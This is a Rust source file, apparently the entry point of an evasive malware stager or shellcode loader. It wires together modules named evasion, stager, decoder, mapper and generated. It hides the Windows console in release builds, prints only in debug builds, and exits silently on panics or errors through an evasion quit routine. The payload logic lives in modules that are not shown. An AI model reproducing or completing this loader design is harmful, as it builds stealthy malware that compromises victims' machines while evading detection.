#![allow(unused)]
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use crate::{evasion::quit, stager::Stager};
use std::error::Error;
use std::{panic, process};

#[macro_export]
macro_rules! dprintln {
    ($($arg:tt)*) => (#[cfg(debug_assertions)] println!($($arg)*));
}

#[macro_export]
macro_rules! deprintln {
    ($($arg:tt)*) => (#[cfg(debug_assertions)] eprintln!($($arg)*));
}

mod allocator;
mod decoder;
mod evasion;
mod generated;
mod mapper;
mod stager;

include!(concat!(env!("OUT_DIR"), "/build_uuid.rs"));

fn main() {
    panic::set_hook(Box::new(|_| {
        quit();
    }));

    match generated::run() {
        Ok(()) => {
            dprintln!("Done, thank you!");
            ()
        }
        Err(e) => {
            deprintln!("Error: {:?}", e);
            quit();
        }
    }
}
